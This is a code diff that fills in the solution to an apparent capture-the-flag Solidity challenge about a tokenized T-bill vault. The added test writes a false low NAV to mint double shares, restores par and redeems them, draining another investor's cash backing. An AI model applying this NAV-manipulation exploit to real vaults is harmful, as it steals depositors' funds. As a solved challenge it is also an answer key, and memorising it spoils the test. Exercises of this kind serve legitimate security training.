@@ -102,14 +102,30 @@ contract FalseNavChallenge is Test {
     // Write your attack here — this is the only function you need to change
     ////////////////////////////////////////////////////////////////////////
     function test_falseNav() public checkSolvedByPlayer {
-        // Hint: the vault trusts navPerShare() for BOTH pricing (subscribe) and paying out
-        // (the queue). You can move that number. What is the cheapest path from "I can write
-        // the NAV" to "I hold more USDC than I started with"?
-        //
-        // Remember the queue: to be paid you must first subscribe (for shares), enqueue those
-        // shares to lock a payout at today's NAV, and then settle and claim.
-        //
-        // TODO: your code goes here
+        // A false low NAV doubles the shares minted for the player's existing cash.
+        vault.attest(int256(PAR / 2));
+        usdc.approve(address(vault), INITIAL_PLAYER_BALANCE);
+        vault.subscribe(INITIAL_PLAYER_BALANCE);
+        assertEq(tBill.balanceOf(player), 2_000e18);
+        assertEq(vault.reserveBalance(), 2_000e6);
+
+        // Restoring par makes those shares redeemable for both investors' cash.
+        vault.attest(int256(PAR));
+        tBill.approve(address(queue), 2_000e18);
+        uint256 id = queue.enqueue(2_000e18);
+        assertEq(queue.requestAt(id).assetsLocked, 2_000e6);
+        assertEq(queue.settle(2_000e6), 2_000e6);
+        assertEq(queue.claim(), 2_000e6);
+
+        // Alice still owns her original claim, but its cash backing has been paid out.
+        assertEq(usdc.balanceOf(player), 2 * INITIAL_PLAYER_BALANCE);
+        assertEq(tBill.balanceOf(player), 0);
+        assertEq(tBill.balanceOf(alice), 1_000e18);
+        assertEq(vault.totalClaimValue(), 1_000e6);
+        assertEq(vault.reserveBalance(), 0);
+        assertEq(queue.pendingShares(), 0);
+        assertEq(queue.totalClaimable(), 0);
+        assertEq(usdc.balanceOf(address(queue)), 0);
     }
 
     ////////////////////////////////////////////////////////////////////////
